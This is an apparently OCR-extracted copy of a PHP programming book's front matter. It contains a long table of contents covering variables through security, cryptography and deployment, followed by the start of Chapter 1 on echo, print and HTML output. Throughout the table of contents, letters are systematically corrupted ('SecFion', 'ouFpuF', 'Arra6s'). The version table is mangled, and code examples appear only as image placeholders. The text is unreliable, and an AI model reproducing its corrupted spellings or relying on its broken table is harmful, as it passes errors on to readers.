![](image_rsrcKGG.jpg)

  

PHP

 PROFESSIONAL'S GUIDE

Mastering​Web​Development​with​Expert Techniques and Best Practices

Published by Manikandan M Copyright@2024 "All rights reserved"

No part of this book may be reproduced or used in any manner without written permission of the copyright owner except for the use of quotations in a book review. ' 'All rights reserved' means that you, as the copyright holder, hold all the rights provided to you by copyright law.

First Edition:2024

Contents

About             1

Chapter 1: Getting started with PHP             2

SecFion 1.1: HTML ouFpuF from web server             2

SecFion 1.2: Hello, World!             3

SecFion 1.3: Non-HTML ouFpuF from web server             3

SecFion 1.4: PHP builF-in server             5

SecFion 1.5: PHP CLI             5

SecFion 1.6: InsFrucFion SeparaFion             6

SecFion 1.7: PHP Tags             7

Chapter 2: Variables             9

SecFion 2.1: Accessing A Variable Dynamically By Name (Variable variables)             9

SecFion 2.2: DaFa Types             10

SecFion 2.3: Global variable besF pracFices             13

SecFion 2.4: DefaulF values of uniniFialized variables             14

SecFion 2.5: Variable Value TruFhiness and IdenFical OperaFor             15

Chapter 3: Variable Scope             18

SecFion 3.1: Superglobal variables             18

SecFion 3.2: SFaFic properFies and variables             18

SecFion 3.3: User-defined global variables             19

Chapter 4: Superglobal Variables PHP             21

SecFion 4.1: Suberglobals explained             21

SecFion 4.2: PHP5 SuperGlobals             28

Chapter 5: Outputting the Value of a Variable             32

SecFion 5.1: echo and prinF             32

SecFion 5.2: OuFpuFFing a sFrucFured view of arrays and obiecFs             33

SecFion 5.3: SFring concaFenaFion wiFh echo             35

SecFion 5.4: prinFf vs sprinFf             36

SecFion 5.5: OuFpuFFing large inFegers             36

SecFion 5.6: OuFpuF a MulFidimensional Array wiFh index and value and prinF inFo Fhe Fable             37

Chapter 6: Constants             39

SecFion 6.1: Defining consFanFs             39

SecFion 6.2: Class ConsFanFs             40

SecFion 6.3: Checking if consFanF is defined             40

SecFion 6.4: Using consFanFs             42

SecFion 6.5: ConsFanF arrays             42

Chapter 7: Magic Constants             43

SecFion 7.1: Difference beFween  FUNCTION  and  METHOD             43

![](image_rsrcKGH.jpg)

SecFion 7.2: Difference beFween​CLASS             , geF\_class() and geF\_called\_class()              43

SecFion 7.3: File & DirecFory ConsFanFs             44

Chapter 8: Comments             45

SecFion 8.1: Single Line CommenFs             45

SecFion 8.2: MulFi Line CommenFs             45

Chapter 9: T6pes             46

SecFion 9.1: Type Comparison             46

SecFion 9.2: Boolean             46

SecFion 9.3: FloaF..................................................................1             47

SecFion 9.4: SFrings             48

SecFion 9.5: Callable             50

SecFion 9.6: Resources             50

SecFion 9.7: Type CasFing             51

SecFion 9.8: Type Juggling             51

SecFion 9.9: Null             52

SecFion 9.10: InFegers             52

Chapter 10: Operators             54

SecFion 10.1: Null Coalescing OperaFor (??)             54

SecFion 10.2: Spaceship OperaFor (c=>)             55

SecFion 10.3: ExecuFion OperaFor (\`\`)             55

SecFion 10.4: IncremenFing (++) and DecremenFing OperaFors (--)             55

SecFion 10.5: Ternary OperaFor (?:)             56

SecFion 10.6: Logical OperaFors (&&/AND and ||/OR)             57

SecFion 10.7: SFring OperaFors (. and .=)             57

SecFion 10.8: ObiecF and Class OperaFors             57

SecFion 10.9: Combined AssignmenF (+= eFc)             59

SecFion 10.10: AlFering operaFor precedence (wiFh parenFheses)             59

SecFion 10.11: Basic AssignmenF (=)             60

SecFion 10.12: AssociaFion             60

SecFion 10.13: Comparison OperaFors             60

SecFion 10.14: BiFwise OperaFors             62

SecFion 10.15: insFanceof (Fype operaFor)             64

Chapter 11: References             67

SecFion 11.1: Assign by Reference             67

SecFion 11.2: ReFurn by Reference             67

SecFion 11.3: Pass by Reference             68

Chapter 12: Arra6s             71

SecFion 12.1: IniFializing an Array             71

SecFion 12.2: Check if key exisFs             73

SecFion 12.3: ValidaFing Fhe array Fype             74

SecFion 12.4: CreaFing an array of variables             74

SecFion 12.5: Checking if a value exisFs in array             74

SecFion 12.6: ArrayAccess and IFeraFor InFerfaces             75

Chapter 13: Arra6 iteration             79

SecFion 13.1: IFeraFing mulFiple arrays FogeFher             79

SecFion 13.2: Using an incremenFal index             80

SecFion 13.3: Using inFernal array poinFers             80

SecFion 13.4: Using foreach             81

SecFion 13.5: Using ArrayObiecF IFeraFor             83

Chapter 14: Executing Upon an Arra6             84

SecFion 14.1: Applying a funcFion Fo each elemenF of an array             84

SecFion 14.2: SpliF array inFo chunks             85

SecFion 14.3: Imploding an array inFo sFring             86

SecFion 14.4: "DesFrucFuring" arrays using lisF()             86

SecFion 14.5: array\_reduce             86

SecFion 14.6: Push a Value on an Array             87

Chapter 15: Manipulating an Arra6             89

SecFion 15.1: FilFering an array             89

SecFion 15.2: Removing elemenFs from an array.............2             90

SecFion 15.3: SorFing an Array             91

SecFion 15.4: WhiFelisF only some array keys             96

SecFion 15.5: Adding elemenF Fo sFarF of array             96

SecFion 15.6: Exchange values wiFh keys             97

SecFion 15.7: Merge Fwo arrays inFo one array             97

Chapter 16: Processing Multiple Arra6s Together             99

SecFion 16.1: Array inFersecFion             99

SecFion 16.2: Merge or concaFenaFe arrays             99

SecFion 16.3: Changing a mulFidimensional array Fo associaFive array             100

SecFion 16.4: Combining Fwo arrays (keys from one, values from anoFher)             100

Chapter 17: Datetime Class             102

SecFion 17.1: CreaFe ImmuFable version of DaFeTime from MuFable prior PHP 5.6             102

SecFion 17.2: Add or SubFracF DaFe InFervals             102

SecFion 17.3: geFTimesFamp             102

SecFion 17.4: seFDaFe             103

SecFion 17.5: CreaFe DaFeTime from cusFom formaF             103

SecFion 17.6: PrinFing DaFeTimes             103

Chapter 18: Working with Dates and Time             105

SecFion 18.1: GeFFing Fhe difference beFween Fwo daFes / Fimes             105

SecFion 18.2: ConverF a daFe inFo anoFher formaF             105

SecFion 18.3: Parse English daFe descripFions inFo a DaFe formaF             107

SecFion 18.4: Using Predefined ConsFanFs for DaFe FormaF             107

Chapter 19: Control Structures             109

SecFion 19.1: if else             109

SecFion 19.2: AlFernaFive synFax for conFrol sFrucFures             109

SecFion 19.3: while             109

SecFion 19.4: do-while             110

SecFion 19.5: goFo             110

SecFion 19.6: declare             110

SecFion 19.7: include & require             111

SecFion 19.8: reFurn             112

SecFion 19.9: for             112

SecFion 19.10: foreach             113

SecFion 19.11: if elseif else             113

SecFion 19.12: if             114

SecFion 19.13: swiFch             114

Chapter 20: Loops             116

SecFion 20.1: conFinue             116

SecFion 20.2: break             117

SecFion 20.3: foreach             118

SecFion 20.4: do...while;             118

SecFion 20.5: for             119

SecFion 20.6: while             120

Chapter 21: Functions             121

SecFion 21.1: Variable-lengFh argumenF lisFs             121

SecFion 21.2: OpFional ParameFers             122

SecFion 21.3: Passing ArgumenFs by Reference             123

SecFion 21.4: Basic FuncFion Usage             124

SecFion 21.5: FuncFion Scope             124

Chapter 22: Functional Programming             125

SecFion 22.1: Closures             125

SecFion 22.2: AssignmenF Fo variables             126

SecFion 22.3: ObiecFs as a funcFion             126

SecFion 22.4: Using ouFside variables             127

SecFion 22.5: Anonymous funcFion             127

SecFion 22.6: Pure funcFions             128

SecFion 22.7: Common funcFional meFhods in PHP             128

SecFion 22.8: Using builF-in funcFions as callbacks             129

SecFion 22.9: Scope             129

SecFion 22.10: Passing a callback funcFion as a parameFer             129

Chapter 23: Alternative S6ntax for Control Structures             131

SecFion 23.1: AlFernaFive if/else sFaFemenF             131

SecFion 23.2: AlFernaFive for sFaFemenF             131

SecFion 23.3: AlFernaFive while sFaFemenF             131

SecFion 23.4: AlFernaFive foreach sFaFemenF             131

SecFion 23.5: AlFernaFive swiFch sFaFemenF             132

Chapter 24: String formatting             133

SecFion 24.1: SFring inFerpolaFion             133

SecFion 24.2: ExFracFing/replacing subsFrings             134

Chapter 25: String Parsing             136

SecFion 25.1: SpliFFing a sFring by separaFors             136

SecFion 25.2: SubsFring             136

SecFion 25.3: Searching a subsFring wiFh sFrpos             138

SecFion 25.4: Parsing sFring using regular expressions             139

Chapter 26: Classes and Objects             140

SecFion 26.1: Class ConsFanFs             140

SecFion 26.2: AbsFracF Classes             142

SecFion 26.3: LaFe sFaFic binding             144

SecFion 26.4: Namespacing and AuFoloading             145

SecFion 26.5: MeFhod and ProperFy VisibiliFy             147

SecFion 26.6: InFerfaces             149

SecFion 26.7: Final heyword             152

SecFion 26.8: AuFoloading             153

SecFion 26.9: Calling a parenF consFrucFor when insFanFiaFing a child             154

SecFion 26.10: Dynamic Binding             155

SecFion 26.11: $Fhis, self and sFaFic plus Fhe singleFon             156

SecFion 26.12: Defining a Basic Class             159

SecFion 26.13: Anonymous Classes             160

Chapter 27: Namespaces             162

SecFion 27.1: Declaring namespaces             162

SecFion 27.2: Referencing a class or funcFion in a namespace             162

SecFion 27.3: Declaring sub-namespaces             163

SecFion 27.4: WhaF are Namespaces?             164

Chapter 28: Sessions             165

SecFion 28.1: session\_sFarF() OpFions             165

SecFion 28.2: Session Locking             165

SecFion 28.3: ManipulaFing session daFa             166

SecFion 28.4: DesFroy an enFire session             166

SecFion 28.5: Safe Session SFarF WiFh no Errors             167

SecFion 28.6: Session name             167

Chapter 29: Cookies             169

SecFion 29.1: Modifying a Cookie             169

SecFion 29.2: SeFFing a Cookie             169

SecFion 29.3: Checking if a Cookie is SeF             170

SecFion 29.4: Removing a Cookie             170

SecFion 29.5: ReFrieving a Cookie             170

Chapter 30: Output Buffering             171

SecFion 30.1: Basic usage geFFing conFenF beFween buffers and clearing             171

SecFion 30.2: Processing Fhe buffer via a callback             171

SecFion 30.3: NesFed ouFpuF buffers             172

SecFion 30.4: Running ouFpuF buffer before any conFenF             173

SecFion 30.5: SFream ouFpuF Fo clienF             174

SecFion 30.6: Using OuFpuF buffer Fo sFore conFenFs in a file, useful for reporFs, invoices eFc              174

SecFion 30.7: Typical usage and reasons for using ob\_sFarF             174

SecFion 30.8: CapFuring Fhe ouFpuF buffer Fo re-use laFer             175

Chapter 31: JSON             177

SecFion 31.1: Decoding a JSON sFring             177

SecFion 31.2: Encoding a JSON sFring             180

SecFion 31.3: Debugging JSON errors             183

SecFion 31.4: Using JsonSerializable in an ObiecF             184

SecFion 31.5: Header ison and Fhe reFurned response             185

Chapter 32: SOAP Client             187

SecFion 32.1: WSDL Mode             187

SecFion 32.2: Non-WSDL Mode             187

SecFion 32.3: Classmaps             187

SecFion 32.4: Tracing SOAP requesF and response             188

Chapter 33: Using cURL in PHP             190

SecFion 33.1: Basic Usage (GET RequesFs)             190

SecFion 33.2: POST RequesFs             190

SecFion 33.3: Using Cookies             191

SecFion 33.4: Using mulFi\_curl Fo make mulFiple POST requesFs             192

SecFion 33.5: Sending mulFi-dimensional daFa and mulFiple files wiFh CurlFile in one requesF              193

SecFion 33.6: CreaFing and sending a requesF wiFh a cusFom meFhod             196

SecFion 33.7: GeF and SeF cusFom hFFp headers in php             196

Chapter 34: Re;ection             198

SecFion 34.1: FeaFure deFecFion of classes or obiecFs             198

SecFion 34.2: TesFing privaFe/proFecFed meFhods             198

SecFion 34.3: Accessing privaFe and proFecFed member variables             200

Chapter 35: Dependenc6 Injection             202

SecFion 35.1: ConsFrucFor IniecFion             202

SecFion 35.2: SeFFer IniecFion             202

SecFion 35.3: ConFainer IniecFion             204

Chapter 36: XML             205

SecFion 36.1: CreaFe a XML using DomDocumenF             205

SecFion 36.2: Read a XML documenF wiFh DOMDocumenF             206

SecFion 36.3: Leveraging XML wiFh PHP's SimpleXML Library             207

SecFion 36.4: CreaFe an XML file using XMLWriFer............5             209

SecFion 36.5: Read a XML documenF wiFh SimpleXML             210

Chapter 37: SimpleXML             212

SecFion 37.1: Loading XML daFa inFo simplexml             212

Chapter 38: Parsing HTML             213

SecFion 38.1: Parsing HTML from a sFring             213

SecFion 38.2: Using XPaFh             213

SecFion 38.3: SimpleXML             213

Chapter 39: Regular Expressions (regexp/PCRE)             215

SecFion 39.1: Global RegExp maFch             215

SecFion 39.2: SFring maFching wiFh regular expressions             216

SecFion 39.3: SpliF sFring inFo array by a regular expression             217

SecFion 39.4: SFring replacing wiFh regular expression             217

SecFion 39.5: SFring replace wiFh callback             217

Chapter 40: Traits             219

SecFion 40.1: WhaF is a TraiF?             219

SecFion 40.2: TraiFs Fo faciliFaFe horizonFal code reuse             220

SecFion 40.3: ConflicF ResoluFion             221

SecFion 40.4: ImplemenFing a SingleFon using TraiFs             222

SecFion 40.5: TraiFs Fo keep classes clean             223

SecFion 40.6: MulFiple TraiFs Usage             224

SecFion 40.7: Changing MeFhod VisibiliFy             224

Chapter 41: Composer Dependenc6 Manager             226

SecFion 41.1: WhaF is Composer?             226

SecFion 41.2: AuFoloading wiFh Composer             227

SecFion 41.3: Difference beFween 'composer insFall' and 'composer updaFe'             227

SecFion 41.4: Composer Available Commands             228

SecFion 41.5: BenefiFs of Using Composer             229

SecFion 41.6: InsFallaFion             230

Chapter 42: Magic Methods             231

![](image_rsrcKGJ.jpg)

SecFion 42.1:​call() and​callSFaFic()             231

SecFion 42.2:  geF(), seF(),  isseF() and  unseF()             232

![](image_rsrcKGK.jpg)

SecFion 42.3:​consFrucF() and​desFrucF()             233

![](image_rsrcKGM.jpg)

SecFion 42.4:

![](image_rsrcKGN.jpg)

SecFion 42.5:

![](image_rsrcKGP.jpg)

SecFion 42.6:

FoSFring()             234

clone()             235

invoke()             235

SecFion 42.7:  sleep() and  wakeup()             236

![](image_rsrcKGR.jpg)

SecFion 42.8:​debugInfo()             236

Chapter 43: File handling             238

SecFion 43.1: Convenience funcFions             238

SecFion 43.2: DeleFing files and direcFories             240

SecFion 43.3: GeFFing file informaFion             240

SecFion 43.4: SFream-based file IO             242

SecFion 43.5: Moving and Copying files and direcFories             244

SecFion 43.6: Minimize memory usage when dealing wiFh large files             245

Chapter 44: Streams             246

SecFion 44.1: RegisFering a sFream wrapper             246

Chapter 45: T6pe hinting             248

SecFion 45.1: Type hinFing classes and inFerfaces             248

![](image_rsrcKGS.jpg)SecFion 45.2: Type hinFing scalar Fypes, arrays and cal6lables             249

SecFion 45.3: Nullable Fype hinFs             250

SecFion 45.4: Type hinFing generic obiecFs             251

SecFion 45.5: Type HinFing No ReFurn(Void)             252

Chapter 46: Filters & Filter Functions             253

SecFion 46.1: ValidaFing Boolean Values             253

[SecFion 46.2: ValidaFing A Number Is A FloaF             253](#part0245.xhtml)

SecFion 46.3: ValidaFe A MAC Address             254

SecFion 46.4: SaniFze Email Addresses             254

SecFion 46.5: SaniFize InFegers             255

SecFion 46.6: SaniFize URLs             255

SecFion 46.7: ValidaFe Email Address             256

SecFion 46.8: ValidaFing A Value Is An InFeger             256

[SecFion 46.9: ValidaFing An InFeger Falls In A Range             257](#part0253.xhtml)

SecFion 46.10: ValidaFe a URL             257

SecFion 46.11: SaniFize FloaFs             259

SecFion 46.12: ValidaFe IP Addresses             261

[SecFion 46.13: SaniFize filFers             262](#part0255.xhtml)

Chapter 47: Generators             263

SecFion 47.1: The Yield heyword             263

SecFion 47.2: Reading a large file wiFh a generaFor             264

[SecFion 47.3: Why use a generaFor?             264](#part0260.xhtml)

SecFion 47.4: Using Fhe send()-funcFion Fo pass values Fo a generaFor             265

Chapter 48: UTF-8             267

SecFion 48.1: InpuF             267

SecFion 48.2: OuFpuF             267

SecFion 48.3: DaFa SForage and Access             267

Chapter 49: Unicode Support in PHP             269

SecFion 49.1: ConverFing Unicode characFers Fo ”\\uxxxx” formaF using PHP             269

SecFion 49.2: ConverFing Unicode characFers Fo Fheir numeric value and/or HTML enFiFies using PHP

.............................................................................................................................  ................................................              269

SecFion 49.3: InFl exFenFion for Unicode supporF             271

Chapter 50: URLs             272

SecFion 50.1: Parsing a URL             272

SecFion 50.2: Build an URL-encoded query sFring from an array             272

[SecFion 50.3: RedirecFing Fo anoFher URL             273](#part0270.xhtml)

Chapter 51: How to break down an URL             275

SecFion 51.1: Using parse\_url()             275

SecFion 51.2: Using explode()             276

SecFion 51.3: Using basename()             276

[Chapter 52: Object Serialization             278](#part0274.xhtml)

SecFion 52.1: Serialize / Unserialize             278

SecFion 52.2: The Serializable inFerface             278

Chapter 53: Serialization             280

[SecFion 53.1: SerializaFion of differenF Fypes             280](#part0276.xhtml)

SecFion 53.2: SecuriFy Issues wiFh unserialize             281

Chapter 54: Closure             284

SecFion 54.1: Basic usage of a closure             284

SecFion 54.2: Using exFernal variables             284

[SecFion 54.3: Basic closure binding             285](#part0279.xhtml)

SecFion 54.4: Closure binding and scope             285

SecFion 54.5: Binding a closure for one call             287

SecFion 54.6: Use closures Fo implemenF observer paFFern             287

[Chapter 55: Reading Request Data             290](#part0282.xhtml)

SecFion 55.1: Reading raw POST daFa             290

SecFion 55.2: Reading POST daFa             290

SecFion 55.3: Reading GET daFa             290

[SecFion 55.4: Handling file upload errors             291](#part0285.xhtml)

SecFion 55.5: Passing arrays by POST             291

SecFion 55.6: Uploading files wiFh HTTP PUT             293

[Chapter 56: T6pe juggling and Non-Strict Comparison Issues             294](#part0287.xhtml)

SecFion 56.1: WhaF is Type Juggling?             294

SecFion 56.2: Reading from a file             294

[SecFion 56.3: SwiFch surprises             295](#part0291.xhtml)

SecFion 56.4: SFricF Fyping             296

Chapter 57: Sockets             298

SecFion 57.1: TCP clienF sockeF             298

SecFion 57.2: TCP server sockeF             299

SecFion 57.3: UDP server sockeF             299

SecFion 57.4: Handling sockeF errors             300

[Chapter 58: PDO             301](#part0297.xhtml)

SecFion 58.1: PrevenFing SQL iniecFion wiFh ParameFerized Queries             301

SecFion 58.2: Basic PDO ConnecFion and ReFrieval             302

SecFion 58.3: DaFabase TransacFions wiFh PDO             303

SecFion 58.4: PDO: connecFing Fo MySQL/MariaDB server             305

SecFion 58.5: PDO: GeF number of affecFed rows by a query             306

SecFion 58.6: PDO::lasFInserFId()             306

[Chapter 59: PHP M6SQLi             308](#part0301.xhtml)

SecFion 59.1: Close connecFion             308

SecFion 59.2: MySQLi connecF             308

SecFion 59.3: Loop Fhrough MySQLi resulFs             309

SecFion 59.4: Prepared sFaFemenFs in MySQLi             309

[SecFion 59.5: Escaping SFrings             310](#part0305.xhtml)

SecFion 59.6: Debugging SQL in MySQLi             311

SecFion 59.7: MySQLi query             311

SecFion 59.8: How Fo geF daFa from a prepared sFaFemenF             312

SecFion 59.9: MySQLi InserF ID             314

[Chapter 60: SQLite3             316](#part0308.xhtml)

SecFion 60.1: SQLiFe3 QuicksFarF TuForial             316

SecFion 60.2: Querying a daFabase             317

SecFion 60.3: ReFrieving only one resulF             318

Chapter 61: Using MongoDB             319

SecFion 61.1: ConnecF Fo MongoDB             319

SecFion 61.2: GeF mulFiple documenFs - find()             319

[SecFion 61.3: GeF one documenF \- findOne()             319](#part0315.xhtml)

SecFion 61.4: InserF documenF             319

SecFion 61.5: UpdaFe a documenF             319

SecFion 61.6: DeleFe a documenF             320

Chapter 62: mongo-php             321

SecFion 62.1: EveryFhing in beFween MongoDB and Php             321

Chapter 63: Using Redis with PHP             324

SecFion 63.1: ConnecFing Fo a Redis insFance             324

SecFion 63.2: InsFalling PHP Redis on UbunFu             324

SecFion 63.3: ExecuFing Redis commands in PHP             324

[Chapter 64: Sending Email             325](#part0323.xhtml)

SecFion 64.1: Sending Email - The basics, more deFails, and a full example             325

SecFion 64.2: Sending HTML Email Using mail()             327

SecFion 64.3: Sending Email WiFh An AFFachmenF Using mail()             328

[SecFion 64.4: Sending Plain TexF Email Using PHPMailer             329](#part0326.xhtml)

SecFion 64.5: Sending HTML Email Using PHPMailer             330

SecFion 64.6: Sending Email WiFh An AFFachmenF Using PHPMailer             331

SecFion 64.7: Sending Plain TexF Email Using Sendgrid             331

SecFion 64.8: Sending Email WiFh An AFFachmenF Using Sendgrid             332

Chapter 65: Using SQLSRV             333

SecFion 65.1: ReFrieving Error Messages             333

[SecFion 65.2: FeFching Query ResulFs             333](#part0328.xhtml)

SecFion 65.3: CreaFing a ConnecFion             334

SecFion 65.4: Making a Simple Query             334

SecFion 65.5: Invoking a SFored Procedure             334

[SecFion 65.6: Making a ParameFerised Query             335](#part0331.xhtml)

Chapter 66: Command Line Interface (CLI)             336

[SecFion 66.1: Handling Program OpFions             336](#part0332.xhtml)

SecFion 66.2: ArgumenF Handling             337

SecFion 66.3: InpuF and OuFpuF Handling             338

SecFion 66.4: ReFurn Codes             339

SecFion 66.5: ResFricF scripF execuFion Fo command line             339

SecFion 66.6: Behavioural differences on Fhe command line             339

SecFion 66.7: Running your scripF             340

SecFion 66.8: Edge Cases of geFopF()             340

SecFion 66.9: Running builF-in web server             341

[Chapter 67: Localization             343](#part0340.xhtml)

SecFion 67.1: Localizing sFrings wiFh geFFexF()             343

Chapter 68: Headers Manipulation             344

SecFion 68.1: Basic SeFFing of a Header             344

Chapter 69: Coding Conventions             345

SecFion 69.1: PHP Tags             345

Chapter 70: As6nchronous programming             346

[SecFion 70.1: AdvanFages of GeneraFors             346](#part0343.xhtml)

SecFion 70.2: Using Icicle evenF loop             346

SecFion 70.3: Spawning non-blocking processes wiFh proc\_open()             347

SecFion 70.4: Reading serial porF wiFh EvenF and DIO             348

SecFion 70.5: HTTP ClienF Based on EvenF ExFension             350

SecFion 70.6: HTTP ClienF Based on Ev ExFension             353

SecFion 70.7: Using Amp evenF loop             357

Chapter 71: How to Detect Client IP Address             359

SecFion 71.1: Proper use of HTTP\_X\_FORWARDED\_FOR             359

SecFion 72.1: GeFFing SFarFed wiFh PDFlib             361

[Chapter 73: YAML in PHP             362](#part0350.xhtml)

SecFion 73.1: InsFalling YAML exFension             362

[SecFion 73.2: Using YAML Fo sFore applicaFion configuraFion             362](#part0351.xhtml)

Chapter 74: Image Processing with GD             364

[SecFion 74.1: Image ouFpuF             364](#part0352.xhtml)

SecFion 74.2: CreaFing an image             365

[SecFion 74.3: Image Cropping and Resizing             366](#part0353.xhtml)

Chapter 75: Imagick             369

SecFion 75.1: FirsF SFeps             369

SecFion 75.2: ConverF Image inFo base64 SFring             369

Chapter 76: SOAP Server             371

SecFion 76.1: Basic SOAP Server             371

Chapter 77: Machine learning             372

SecFion 77.1: ClassificaFion using PHP-ML             372

[SecFion 77.2: Regression             373](#part0366.xhtml)

SecFion 77.3: ClusFering             375

Chapter 78: Cache             377

[SecFion 78.1: Caching using memcache             377](#part0368.xhtml)

SecFion 78.2: Cache Using APC Cache             378

[Chapter 79: Autoloading Primer             380](#part0369.xhtml)

[SecFion 79.1: AuFoloading as parF of a framework soluFion             380](#part0371.xhtml)

SecFion 79.2: Inline class definiFion, no loading required             380

SecFion 79.3: Manual class loading wiFh require             381

SecFion 79.4: AuFoloading replaces manual class definiFion loading             381

[SecFion 79.5: AuFoloading wiFh Composer             382](#part0376.xhtml)

Chapter 80: SPL data structures             383

SecFion 80.1: SplFixedArray             383

[Chapter 81: IMAP             387](#part0378.xhtml)

SecFion 81.1: ConnecFing Fo a mailbox             387

SecFion 81.2: InsFall IMAP exFension             388

SecFion 81.3: LisF all folders in Fhe mailbox             388

[SecFion 81.4: Finding messages in Fhe mailbox             389](#part0379.xhtml)

Chapter 82: HTTP Authentication             391

[SecFion 82.1: Simple auFhenFicaFe             391](#part0384.xhtml)

Chapter 83: WebSockets             392

SecFion 83.1: Simple TCP/IP server             392

[Chapter 84: BC Math (Binar6 Calculator)             394](#part0387.xhtml)

SecFion 84.1: Using bcmaFh Fo read/wriFe a binary long on 32-biF sysFem             394

SecFion 84.2: Comparison beFween BCMaFh and floaF ariFhmeFic operaFions             395

Chapter 85: Docker deplo6ment             397

SecFion 85.1: GeF docker image for php             397

SecFion 85.2: WriFing dockerfile             397

[SecFion 85.3: Building image             397](#part0390.xhtml)

SecFion 85.4: SFarFing applicaFion conFainer             398

Chapter 86: APCu             399

SecFion 86.1: IFeraFing over EnFries             399

SecFion 86.3: SFore informaFion             399

Chapter 87: PHP Built in server             400

SecFion 87.1: Running Fhe builF in server             400

[SecFion 87.2: builF in server wiFh specific direcFory and rouFer scripF             400](#part0398.xhtml)

Chapter 88: PSR             401

[SecFion 88.1: PSR-4: AuFoloader             401](#part0399.xhtml)

SecFion 88.2: PSR-1: Basic Coding SFandard             402

[Chapter 89: PHPDoc             403](#part0401.xhtml)

SecFion 89.1: Describing a variable             403

SecFion 89.2: Adding meFadaFa Fo funcFions             403

[SecFion 89.3: Describing parameFers             404](#part0404.xhtml)

SecFion 89.4: CollecFions             405

SecFion 89.5: Adding meFadaFa Fo files             406

SecFion 89.6: InheriFing meFadaFa from parenF sFrucFures             406

Chapter 90: Design Patterns             408

[SecFion 90.1: MeFhod Chaining in PHP             408](#part0406.xhtml)

Chapter 91: Compile PHP Extensions             410

SecFion 91.1: Compiling on Linux             410

[Chapter 92: Common Errors             411](#part0407.xhtml)

SecFion 92.1: Call feFch\_assoc on boolean             411

SecFion 92.2: UnexpecFed $end             411

[Chapter 93: Compilation of Errors and Warnings             413](#part0408.xhtml)

SecFion 93.1: Parse error: synFax error, unexpecFed T\_PAAMAYIM\_NEhUDOTAYIM             413

SecFion 93.2: NoFice: Undefined index             413

[SecFion 93.3: Warning: CannoF modify header informaFion \- headers already senF             413](#part0410.xhtml)

Chapter 94: Exception Handling and Error Reporting             415

SecFion 94.1: SeFFing error reporFing and where Fo display Fhem             415

SecFion 94.2: Logging faFal errors             415

Chapter 95: Debugging             417

SecFion 95.1: Dumping variables             417

SecFion 95.2: Displaying errors             417

[SecFion 95.3: phpinfo()             418](#part0415.xhtml#aJHW)

SecFion 95.4: Xdebug             418

SecFion 95.5: Error ReporFing (use Fhem boFh)             419

SecFion 95.6: phpversion()             419

[Chapter 96: Unit Testing             420](#part0417.xhtml)

SecFion 96.1: TesFing class rules             420

[SecFion 96.2: PHPUniF DaFa Providers             423](#part0418.xhtml)

[SecFion 96.3: TesF excepFions             426](#part0420.xhtml)

Chapter 97: Performance             428

SecFion 97.1: Profiling wiFh Xdebug             428

SecFion 97.2: Memory Usage             429

[SecFion 97.3: Profiling wiFh XHProf             430](#part0422.xhtml)

Chapter 98: Multiprocessing             432

SecFion 98.1: MulFiprocessing using builF-in fork funcFions             432

[SecFion 98.2: CreaFing child process using fork             432](#part0424.xhtml)

SecFion 98.3: InFer-Process CommunicaFion             433

Chapter 99: Multi Threading Extension             434

SecFion 9

9.1: GeFFing SFarFed             434

SecFion 99.2: Using Pools and Workers             434

Chapter 100: Secure Remeber Me             436

[SecFion 100.1: ”heep Me Logged In” \- Fhe besF approach             436](#part0427.xhtml)

Chapter 101: Securit6             437

SecFion 101.1: PHP Version Leakage             437

SecFion 101.2: Cross-SiFe ScripFing (XSS)             437

[SecFion 101.3: Cross-SiFe RequesF Forgery             439](#part0435.xhtml)

SecFion 101.4: Command Line IniecFion             440

SecFion 101.5: SFripping Tags             441

SecFion 101.6: File Inclusion             442

[SecFion 101.7: Error ReporFing             442](#part0438.xhtml)

SecFion 101.8: Uploading files             443

Chapter 102: Cr6ptograph6             446

SecFion 102.1: SymmeFric EncrypFion and DecrypFion of large Files wiFh OpenSSL             446

[SecFion 102.2: SymmeFric Cipher             448](#part0440.xhtml)

Chapter 103: Password Hashing Functions             449

SecFion 103.1: CreaFing a password hash             449

SecFion 103.2: DeFermine if an exisFing password hash can be upgraded Fo a sFronger algoriFhm              450

[SecFion 103.3: Verifying a password againsF a hash             451](#part0442.xhtml)

Chapter 104: Contributing to the PHP Manual             452

SecFion 104.1: Improve Fhe official documenFaFion             452

SecFion 104.2: Tips for conFribuFing Fo Fhe manual             452

[Chapter 105: Contributing to the PHP Core             453](#part0443.xhtml)

SecFion 105.1: SeFFing up a basic developmenF environmenF             453

Appendix A: Installing a PHP environment on Windows             454

SecFion A.1: Download, InsFall and use WAMP             454

SecFion A.2: InsFall PHP and use iF wiFh IIS             454

SecFion A.3: Download and InsFall XAMPP             455

Appendix B: Installing on Linux/Unix Environments             458

[SecFion B.1: Command Line InsFall Using APT for PHP 7             458](#part0452.xhtml)

SecFion B.2: InsFalling in EnFerprise Linux disFribuFions (CenFOS, ScienFific Linux, eFc)             458

Credits             460

[You ma6 also like             468](#part0455.xhtml)

Chapter 1: Getting started with PHP

PHP 7.x

![](image_rsrcKGT.jpg)Version Supported Until Release Date

te

te

Legacy Versions

Version Supported Until Release Date

| 3.0 || 2000-10-20 || 1998-06-06 |
| --- | --- | --- |
| 2.0 ||  || 1997-11-01 |
| 1.0 ||  || 1995-06-08 |

Section 1.1: HTML output from web server

PHP can be used to add content to HTML files. While HTML is processed directly by a web browser, PHP scripts are executed by a web server and the resulting HTML is sent to the browser.

The following HTML markup contains a PHP statement that will add Hello World! to the output:

![](image_rsrcKGU.jpg)

When this is saved as a PHP script and executed by a web server, the following HTML will be sent to the user's browser:

![](image_rsrcKGV.jpg)

![](image_rsrcKGW.jpg)

PHP 5.x Version ≥ 5.4

echo also has a shortcut syntax, which lets you immediately print a value. Prior to PHP 5.4.0, this short syntax only works with the short\_open\_tag configuration setting enabled.

For example, consider the following code:

![](image_rsrcKGX.jpg)

Its output is identical to the output of the following:

![](image_rsrcKGY.jpg)

In real-world applications, all data output by PHP to an HTML page should be properly escaped to prevent XSS (Cross-site scripting) attacks or text corruption.

See also: Strings and PSR-1, which describes best practices, including the proper use of short tags (<?= ... ?>).

Section 1.2: Hello, World!

The most widely used language construct to print output in PHP is echo:

![](image_rsrcKGZ.jpg)

Alternatively, you can also use print:

![](image_rsrcKH0.jpg)

Both statements perform the same function, with minor differences:

![](image_rsrcKH1.jpg)echo has a void return, whereas print returns an int with a value of 1

![](image_rsrcKH2.jpg)echo can take multiple arguments (without parentheses only), whereas print only takes one argument

![](image_rsrcKH3.jpg)echo is slightly faster than print

Both echo and print are language constructs, not functions. That means they do not require parentheses around their arguments. For cosmetic consistency with functions, parentheses can be included. Extensive examples of the use of echo and print are available elsewhere.

C-style printf and related functions are available as well, as in the following example:

![](image_rsrcKH4.jpg)

